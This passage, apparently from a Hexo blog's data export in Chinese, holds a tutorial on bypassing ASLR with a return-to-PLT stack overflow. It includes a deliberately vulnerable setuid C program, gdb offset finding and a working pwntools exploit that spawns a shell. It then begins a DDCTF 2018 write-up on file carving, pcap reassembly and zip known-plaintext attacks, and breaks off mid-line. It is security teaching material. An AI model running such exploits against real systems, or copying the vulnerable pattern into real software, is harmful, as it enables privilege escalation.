directory.\n```\n\n卡在这个地方:\n\n```\n0x7ffff7a332f6 <do_system+1094>:\tmovaps XMMWORD PTR [rsp+0x40],xmm0\n```\n\n这是因为movaps需要我们的rsp地址对齐到16字节。\n\n当前rsp的值:\n\n```\nRSP: 0x7fffffffdbf8\n```\n\n知道原因后，我们可以重新构造如下payload:\n\n> 'A' * 280 + ret_addr + shell_addr\n\n脚本如下:\n\n```python\nfrom pwn import *\n\n# 'A' * 280 + ret_addr + shell_addr\npayload = 'A' * 280 + '\\x38\\x06\\x40\\x00\\x00\\x00\\x00\\x00' + '\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'\n\nio = process(\"./vuln\")\nio.sendline(payload)\nio.interactive()\n```\n\n\n\n","slug":"bypassaslr-1","published":1,"updated":"2018-06-14T09:05:19.337Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jos0004ly4j0rxeaa40","content":"<h1 id=\"绕过ASLR–return2plt\"><a href=\"#绕过ASLR–return2plt\" class=\"headerlink\" title=\"绕过ASLR–return2plt\"></a>绕过ASLR–return2plt</h1><h2 id=\"编译代码\"><a href=\"#编译代码\" class=\"headerlink\" title=\"编译代码\"></a>编译代码</h2><ol>\n<li><p>源代码</p>\n<pre><code class=\"c\">#include&lt;stdio.h&gt;\n#include &lt;string.h&gt;\n/* Eventhough shell() function isnt invoked directly, its needed\n   here since &#39;system@PLT&#39; and &#39;exit@PLT&#39; stub code should be pres\n   ent in executable to successfully exploit it. */\nvoid shell() {\n    system(&quot;/bin/sh&quot;);\n    exit(0);\n}\nint main(int argc, char* argv[]) {\n    int i=0;\n    char buf[256];\n    read(0, buf, 500);\n    printf(&quot;%s\\n&quot;,buf);\n    return 0;\n}\n</code></pre>\n</li>\n<li><p>编译命令</p>\n<pre><code class=\"shell\">#echo 2 &gt; /proc/sys/kernel/randomize_va_space\n$gcc -g -fno-stack-protector -no-pie -o vuln vuln.c\n$sudo chown root vuln\n$sudo chgrp root vuln\n$sudo chmod +s vuln\n</code></pre>\n</li>\n</ol>\n<a id=\"more\"></a>\n<h2 id=\"调试代码\"><a href=\"#调试代码\" class=\"headerlink\" title=\"调试代码\"></a>调试代码</h2><pre><code>gdb-peda$ i func\nAll defined functions:\n\nNon-debugging symbols:\n0x0000000000400470  _init\n0x00000000004004a0  puts@plt\n0x00000000004004b0  system@plt\n0x00000000004004c0  read@plt\n0x00000000004004d0  exit@plt\n0x00000000004004e0  _start\n0x0000000000400510  _dl_relocate_static_pie\n0x0000000000400520  deregister_tm_clones\n0x0000000000400550  register_tm_clones\n0x0000000000400590  __do_global_dtors_aux\n0x00000000004005c0  frame_dummy\n0x00000000004005c7  shell\n0x00000000004005e6  main\n0x0000000000400640  __libc_csu_init\n0x00000000004006b0  __libc_csu_fini\n0x00000000004006b4  _fini\n</code></pre><p>首先，我们找到shell函数的地址<code>0x00000000004005c7</code></p>\n<p>再找到ret地址的偏移:</p>\n<pre><code>gdb-peda$ pattern_create 300\n&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%&#39;\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln \nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x0 \nRBX: 0x0 \nRCX: 0x7ffff7af4154 (&lt;__GI___libc_write+20&gt;:    cmp    rax,0xfffffffffffff000)\nRDX: 0x7ffff7dd18c0 --&gt; 0x0 \nRSI: 0x602260 --&gt; 0x4173414125410a7f \nRDI: 0x1 \nRBP: 0x3425416525414925 (&#39;%IA%eA%4&#39;)\nRSP: 0x7fffffffdd98 (&quot;A%JA%fA%5A%KA%gA%6A%\\n\\177&quot;)\nRIP: 0x400638 (&lt;main+82&gt;:    ret)\nR8 : 0x0 \nR9 : 0x0 \nR10: 0x602010 --&gt; 0x0 \nR11: 0x246 \nR12: 0x4004e0 (&lt;_start&gt;:    xor    ebp,ebp)\nR13: 0x7fffffffde70 --&gt; 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x40062d &lt;main+71&gt;:    call   0x4004a0 &lt;puts@plt&gt;\n   0x400632 &lt;main+76&gt;:    mov    eax,0x0\n   0x400637 &lt;main+81&gt;:    leave  \n=&gt; 0x400638 &lt;main+82&gt;:    ret    \n   0x400639:    nop    DWORD PTR [rax+0x0]\n   0x400640 &lt;__libc_csu_init&gt;:    push   r15\n   0x400642 &lt;__libc_csu_init+2&gt;:    push   r14\n   0x400644 &lt;__libc_csu_init+4&gt;:    mov    r15,rdx\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd98 (&quot;A%JA%fA%5A%KA%gA%6A%\\n\\177&quot;)\n0008| 0x7fffffffdda0 (&quot;5A%KA%gA%6A%\\n\\177&quot;)\n0016| 0x7fffffffdda8 --&gt; 0x7f0a25413625 \n0024| 0x7fffffffddb0 --&gt; 0x100008000 \n0032| 0x7fffffffddb8 --&gt; 0x4005e6 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffddc0 --&gt; 0x0 \n0048| 0x7fffffffddc8 --&gt; 0xd10c02d6c0ba1de5 \n0056| 0x7fffffffddd0 --&gt; 0x4004e0 (&lt;_start&gt;:    xor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0000000000400638 in main ()\ngdb-peda$ pattern_offset A%JA%fA%5A%KA%gA%6A%\\n\\177\nA%JA%fA%5A%KA%gA%6A% found at offset: 280\n</code></pre><p>现在构造payload如下:</p>\n<blockquote>\n<p>‘A’ * 280 + shell_addr</p>\n</blockquote>\n<p>测试一下:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ python -c &quot;print &#39;A&#39; * 280 + &#39;\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00&#39;&quot; &gt; temp\n</code></pre><p>我们发现，并没有给我们shell。</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...(no debugging symbols found)...done.\ngdb-peda$ r &lt; temp\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln &lt; temp\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@\n[New process 87894]\n\nThread 2.1 &quot;vuln&quot; received signal SIGSEGV, Segmentation fault.\n[Switching to process 87894]\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&#39;-c&#39;)\nRBX: 0x0 \nRCX: 0x7ffff7b97e9f --&gt; 0x2074697865006873 (&#39;sh&#39;)\nRDX: 0x0 \nRSI: 0x7ffff7dd16a0 --&gt; 0x0 \nRDI: 0x2 \nRBP: 0x7fffffffdc58 --&gt; 0x0 \nRSP: 0x7fffffffdbf8 --&gt; 0x7fffffffdc80 --&gt; 0x0 \nRIP: 0x7ffff7a332f6 (&lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0)\nR8 : 0x7ffff7dd1600 --&gt; 0x0 \nR9 : 0x0 \nR10: 0x8 \nR11: 0x246 \nR12: 0x4006c4 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)\nR13: 0x7fffffffde70 --&gt; 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff7a332e6 &lt;do_system+1078&gt;:    movq   xmm0,QWORD PTR [rsp+0x8]\n   0x7ffff7a332ec &lt;do_system+1084&gt;:    mov    QWORD PTR [rsp+0x8],rax\n   0x7ffff7a332f1 &lt;do_system+1089&gt;:    movhps xmm0,QWORD PTR [rsp+0x8]\n=&gt; 0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0\n   0x7ffff7a332fb &lt;do_system+1099&gt;:    call   0x7ffff7a23110 &lt;__GI___sigaction&gt;\n   0x7ffff7a33300 &lt;do_system+1104&gt;:    lea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 &lt;quit&gt;\n   0x7ffff7a33307 &lt;do_system+1111&gt;:    xor    edx,edx\n   0x7ffff7a33309 &lt;do_system+1113&gt;:    mov    edi,0x3\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdbf8 --&gt; 0x7fffffffdc80 --&gt; 0x0 \n0008| 0x7fffffffdc00 --&gt; 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&#39;-c&#39;)\n0016| 0x7fffffffdc08 --&gt; 0x0 \n0024| 0x7fffffffdc10 --&gt; 0x0 \n0032| 0x7fffffffdc18 --&gt; 0x7ffff7a33360 (&lt;cancel_handler&gt;:    push   rbx)\n0040| 0x7fffffffdc20 --&gt; 0x7fffffffdc14 --&gt; 0xf7a3336000000000 \n0048| 0x7fffffffdc28 --&gt; 0x0 \n0056| 0x7fffffffdc30 --&gt; 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00007ffff7a332f6 in do_system (line=0x4006c4 &quot;/bin/sh&quot;) at ../sysdeps/posix/system.c:125\n125    ../sysdeps/posix/system.c: No such file or directory.\n</code></pre><p>卡在这个地方:</p>\n<pre><code>0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0\n</code></pre><p>这是因为movaps需要我们的rsp地址对齐到16字节。</p>\n<p>当前rsp的值:</p>\n<pre><code>RSP: 0x7fffffffdbf8\n</code></pre><p>知道原因后，我们可以重新构造如下payload:</p>\n<blockquote>\n<p>‘A’ * 280 + ret_addr + shell_addr</p>\n</blockquote>\n<p>脚本如下:</p>\n<pre><code class=\"python\">from pwn import *\n\n# &#39;A&#39; * 280 + ret_addr + shell_addr\npayload = &#39;A&#39; * 280 + &#39;\\x38\\x06\\x40\\x00\\x00\\x00\\x00\\x00&#39; + &#39;\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00&#39;\n\nio = process(&quot;./vuln&quot;)\nio.sendline(payload)\nio.interactive()\n</code></pre>\n","site":{"data":{}},"excerpt":"<h1 id=\"绕过ASLR–return2plt\"><a href=\"#绕过ASLR–return2plt\" class=\"headerlink\" title=\"绕过ASLR–return2plt\"></a>绕过ASLR–return2plt</h1><h2 id=\"编译代码\"><a href=\"#编译代码\" class=\"headerlink\" title=\"编译代码\"></a>编译代码</h2><ol>\n<li><p>源代码</p>\n<pre><code class=\"c\">#include&lt;stdio.h&gt;\n#include &lt;string.h&gt;\n/* Eventhough shell() function isnt invoked directly, its needed\n   here since &#39;system@PLT&#39; and &#39;exit@PLT&#39; stub code should be pres\n   ent in executable to successfully exploit it. */\nvoid shell() {\n    system(&quot;/bin/sh&quot;);\n    exit(0);\n}\nint main(int argc, char* argv[]) {\n    int i=0;\n    char buf[256];\n    read(0, buf, 500);\n    printf(&quot;%s\\n&quot;,buf);\n    return 0;\n}\n</code></pre>\n</li>\n<li><p>编译命令</p>\n<pre><code class=\"shell\">#echo 2 &gt; /proc/sys/kernel/randomize_va_space\n$gcc -g -fno-stack-protector -no-pie -o vuln vuln.c\n$sudo chown root vuln\n$sudo chgrp root vuln\n$sudo chmod +s vuln\n</code></pre>\n</li>\n</ol>","more":"<h2 id=\"调试代码\"><a href=\"#调试代码\" class=\"headerlink\" title=\"调试代码\"></a>调试代码</h2><pre><code>gdb-peda$ i func\nAll defined functions:\n\nNon-debugging symbols:\n0x0000000000400470  _init\n0x00000000004004a0  puts@plt\n0x00000000004004b0  system@plt\n0x00000000004004c0  read@plt\n0x00000000004004d0  exit@plt\n0x00000000004004e0  _start\n0x0000000000400510  _dl_relocate_static_pie\n0x0000000000400520  deregister_tm_clones\n0x0000000000400550  register_tm_clones\n0x0000000000400590  __do_global_dtors_aux\n0x00000000004005c0  frame_dummy\n0x00000000004005c7  shell\n0x00000000004005e6  main\n0x0000000000400640  __libc_csu_init\n0x00000000004006b0  __libc_csu_fini\n0x00000000004006b4  _fini\n</code></pre><p>首先，我们找到shell函数的地址<code>0x00000000004005c7</code></p>\n<p>再找到ret地址的偏移:</p>\n<pre><code>gdb-peda$ pattern_create 300\n&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%&#39;\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln \nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x0 \nRBX: 0x0 \nRCX: 0x7ffff7af4154 (&lt;__GI___libc_write+20&gt;:    cmp    rax,0xfffffffffffff000)\nRDX: 0x7ffff7dd18c0 --&gt; 0x0 \nRSI: 0x602260 --&gt; 0x4173414125410a7f \nRDI: 0x1 \nRBP: 0x3425416525414925 (&#39;%IA%eA%4&#39;)\nRSP: 0x7fffffffdd98 (&quot;A%JA%fA%5A%KA%gA%6A%\\n\\177&quot;)\nRIP: 0x400638 (&lt;main+82&gt;:    ret)\nR8 : 0x0 \nR9 : 0x0 \nR10: 0x602010 --&gt; 0x0 \nR11: 0x246 \nR12: 0x4004e0 (&lt;_start&gt;:    xor    ebp,ebp)\nR13: 0x7fffffffde70 --&gt; 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x40062d &lt;main+71&gt;:    call   0x4004a0 &lt;puts@plt&gt;\n   0x400632 &lt;main+76&gt;:    mov    eax,0x0\n   0x400637 &lt;main+81&gt;:    leave  \n=&gt; 0x400638 &lt;main+82&gt;:    ret    \n   0x400639:    nop    DWORD PTR [rax+0x0]\n   0x400640 &lt;__libc_csu_init&gt;:    push   r15\n   0x400642 &lt;__libc_csu_init+2&gt;:    push   r14\n   0x400644 &lt;__libc_csu_init+4&gt;:    mov    r15,rdx\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd98 (&quot;A%JA%fA%5A%KA%gA%6A%\\n\\177&quot;)\n0008| 0x7fffffffdda0 (&quot;5A%KA%gA%6A%\\n\\177&quot;)\n0016| 0x7fffffffdda8 --&gt; 0x7f0a25413625 \n0024| 0x7fffffffddb0 --&gt; 0x100008000 \n0032| 0x7fffffffddb8 --&gt; 0x4005e6 (&lt;main&gt;:    push   rbp)\n0040| 0x7fffffffddc0 --&gt; 0x0 \n0048| 0x7fffffffddc8 --&gt; 0xd10c02d6c0ba1de5 \n0056| 0x7fffffffddd0 --&gt; 0x4004e0 (&lt;_start&gt;:    xor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0000000000400638 in main ()\ngdb-peda$ pattern_offset A%JA%fA%5A%KA%gA%6A%\\n\\177\nA%JA%fA%5A%KA%gA%6A% found at offset: 280\n</code></pre><p>现在构造payload如下:</p>\n<blockquote>\n<p>‘A’ * 280 + shell_addr</p>\n</blockquote>\n<p>测试一下:</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ python -c &quot;print &#39;A&#39; * 280 + &#39;\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00&#39;&quot; &gt; temp\n</code></pre><p>我们发现，并没有给我们shell。</p>\n<pre><code>tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...(no debugging symbols found)...done.\ngdb-peda$ r &lt; temp\nStarting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln &lt; temp\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@\n[New process 87894]\n\nThread 2.1 &quot;vuln&quot; received signal SIGSEGV, Segmentation fault.\n[Switching to process 87894]\n\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&#39;-c&#39;)\nRBX: 0x0 \nRCX: 0x7ffff7b97e9f --&gt; 0x2074697865006873 (&#39;sh&#39;)\nRDX: 0x0 \nRSI: 0x7ffff7dd16a0 --&gt; 0x0 \nRDI: 0x2 \nRBP: 0x7fffffffdc58 --&gt; 0x0 \nRSP: 0x7fffffffdbf8 --&gt; 0x7fffffffdc80 --&gt; 0x0 \nRIP: 0x7ffff7a332f6 (&lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0)\nR8 : 0x7ffff7dd1600 --&gt; 0x0 \nR9 : 0x0 \nR10: 0x8 \nR11: 0x246 \nR12: 0x4006c4 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)\nR13: 0x7fffffffde70 --&gt; 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff7a332e6 &lt;do_system+1078&gt;:    movq   xmm0,QWORD PTR [rsp+0x8]\n   0x7ffff7a332ec &lt;do_system+1084&gt;:    mov    QWORD PTR [rsp+0x8],rax\n   0x7ffff7a332f1 &lt;do_system+1089&gt;:    movhps xmm0,QWORD PTR [rsp+0x8]\n=&gt; 0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0\n   0x7ffff7a332fb &lt;do_system+1099&gt;:    call   0x7ffff7a23110 &lt;__GI___sigaction&gt;\n   0x7ffff7a33300 &lt;do_system+1104&gt;:    lea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 &lt;quit&gt;\n   0x7ffff7a33307 &lt;do_system+1111&gt;:    xor    edx,edx\n   0x7ffff7a33309 &lt;do_system+1113&gt;:    mov    edi,0x3\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdbf8 --&gt; 0x7fffffffdc80 --&gt; 0x0 \n0008| 0x7fffffffdc00 --&gt; 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&#39;-c&#39;)\n0016| 0x7fffffffdc08 --&gt; 0x0 \n0024| 0x7fffffffdc10 --&gt; 0x0 \n0032| 0x7fffffffdc18 --&gt; 0x7ffff7a33360 (&lt;cancel_handler&gt;:    push   rbx)\n0040| 0x7fffffffdc20 --&gt; 0x7fffffffdc14 --&gt; 0xf7a3336000000000 \n0048| 0x7fffffffdc28 --&gt; 0x0 \n0056| 0x7fffffffdc30 --&gt; 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00007ffff7a332f6 in do_system (line=0x4006c4 &quot;/bin/sh&quot;) at ../sysdeps/posix/system.c:125\n125    ../sysdeps/posix/system.c: No such file or directory.\n</code></pre><p>卡在这个地方:</p>\n<pre><code>0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0\n</code></pre><p>这是因为movaps需要我们的rsp地址对齐到16字节。</p>\n<p>当前rsp的值:</p>\n<pre><code>RSP: 0x7fffffffdbf8\n</code></pre><p>知道原因后，我们可以重新构造如下payload:</p>\n<blockquote>\n<p>‘A’ * 280 + ret_addr + shell_addr</p>\n</blockquote>\n<p>脚本如下:</p>\n<pre><code class=\"python\">from pwn import *\n\n# &#39;A&#39; * 280 + ret_addr + shell_addr\npayload = &#39;A&#39; * 280 + &#39;\\x38\\x06\\x40\\x00\\x00\\x00\\x00\\x00&#39; + &#39;\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00&#39;\n\nio = process(&quot;./vuln&quot;)\nio.sendline(payload)\nio.interactive()\n</code></pre>"},{"title":"ddctf2018","date":"2018-04-20T06:45:40.000Z","_content":"# 签到题目:\n复制，粘贴\n\n# (╯°□°）╯︵ ┻━┻\n题目给了一个字符串\n```\nd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n```\n\n首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，\"DD\"两个字符，在字符串中找到两组相邻的字符串，找到了\"c4c4\"和\"e1e1\"：\n\nd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n\n进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示\"DD\", 然后以此类推：\n\n![avatar](/images/ddctf/20180420150038.png)\n\n# 第四扩展FS\n1. 下载下来是一张图片\n\n首先:``` binwalk windows.jpg```\n\n```\nsecurity:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg\n\nDECIMAL         HEX             DESCRIPTION\n-------------------------------------------------------------------------------------------------------\n30              0x1E            TIFF image data, big-endian\n2871992         0x2BD2B8        LZMA compressed data, properties: 0x01, dictionary size: 2097152 bytes, uncompressed size: 134217728 bytes\n7236510         0x6E6B9E        Zip archive data, at least v2.0 to extract, compressed size: 20430, uncompressed size: 33350, name: \"file.txt\"\n7257054         0x6EBBDE        End of Zip archive\n\nProgress: 81.81% (10890274 / 13310878)\n```\n可以看到图片里边有个压缩包。\n这时候，可以使用`dd`或者`foremost`命令，来分离压缩包。\n\n> dd if=windows.jpg of=temp.zip skip=7236510 count=20544 bs=1  \n> foremost windows.jpg\n\n得到一个压缩包，然后，查看图片属性，会在详细信息->备注里看到一个字符串\"Pactera\"，估计就是密码。\n\n2. 然后打开file.txt\n\n![avatar](/images/ddctf/20180420151247.png)  \n可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。\n\n```\ngrep -o . file.txt | sort |uniq -c | sort -rn\n```\n\n![avatar](/images/ddctf/20180420151941.png)\n\n然后从新组合一下，就得到flag了。\n\n```\nDDCTF{ZuozHengqU3dEshi}\n```\n<!--more-->\n\n# 流量分析\n这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。  \n过程如下:\n首先大体上浏览整个数据包，会发现，大体上就是3个部分:  \n\n+  ftp 发送了两个zip,Fl-g.zip和sqlmap.zip,传了一大堆数据  \n+  邮件相关的数据包\n+  https相关的包，由于只有几个，竟然被我选择性忽略了。\n\n## ftp之Fl-g.zxip\n> tcp.stream eq 2004   \n\n右键follow tcp流，保存数据，发现只有119kb，解压也提示包损坏，要密码，最终也没啥结果。\n\n然后，感觉应该是follow tcp流，没有得到所有的数据，于是，使用:\n> tcp.stream eq 2004 && ftp-data\n\n得到Fl-g.zip相关的数据包,另存为flag.pcap，然后编写代码，一个一个的拼接数据。\n\n```\nfrom scapy.all import * \npcaps = rdpcap(\"flag.pcap\")\n\nfp = open(\"flag.zip\", \"wb\")\nlength = 0\nfor pcap in pcaps:\n    value = pcap['Raw'].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n```\n得到13M大小的flag.zip,通过一番操作，尝试了密码爆破，伪加密，压缩包修复，来来回回折腾了几遍，最终，使用7-zip，密码:zhangsan，竟然解压得到了一个类似于mp4格式的文件，不知道这玩意和qr-code.jpg有什么关系，还没办法播放。主要原因，还是Fl-g.zip缺失了大量的数据，在明知缺失大量数据的情况下，感觉应该立即放弃，不过这压缩包名字实在太忽悠，折腾了3,4天我才放弃，浪费我大量时间。\n\n## ftp之sqlmap.zip\n> tcp.stream eq 2005\n\n既然给了这个压缩包，感觉应该会有点用（实际上:一点用没有）,首先，follow tcp流，只有163kb，于是和Fl-g.zip一样,过滤:\n> tcp.stream eq 2004 && ftp-data\n\n得到sqlmap.zip相关的数据包,另存为sqlmap.pcap，然后编写代码，一个一个的拼接数据。\n\n\n```\nfrom scapy.all import * \npcaps = rdpcap(\"sqlmap.pcap\")\n\nfp = open(\"sqlmap.zip\", \"wb\")\nlength = 0\nfor pcap in pcaps:\n    value = pcap['Raw'].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n```\n\n得到了一个sqlmap.zip，第一次打开，用winrar，点击工具->修复压缩文件，修复一下。然后，爆破，伪加密，又搞了一遍，我都不知道我哪来的耐心。最后，想到已知明文攻击。\n\n已知明文攻击: 已知明文攻击要求加密的压缩包和非加密的压缩包里有相同的文件，并且文件的crc32值要相同，然后就可以使用archpr这个软件进行已知明文攻击。\n\n然后，去github.com下载最新版本的sqlmap,发现文件的crc32值并不相同，需要下载sqlmap1.1.10.zip才行。最后，解压sqlmap.zip得到的文件和sql1.1.10.zip里的文件一模一样，没有一点有用的东西。\n\n## 邮件部分\n通过follow tcp流，当tcp.stream eq 2016的时候，会看到有一个image001图片:\n\n```\nContent-type: image/png; name=\"image001.png\";\n x-mac-creator=\"4F50494D\";\n x-mac-type=\"504E4766\"\nContent-ID: <image001.png@01D38B05.8079CE40>\nContent-disposition: inline;\n\tfilename=\"image001.png\"\nContent-transfer-encoding: base64\n```\n\n下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。\n\n```\nimport base64\n\nfp = open(\"1.txt\", 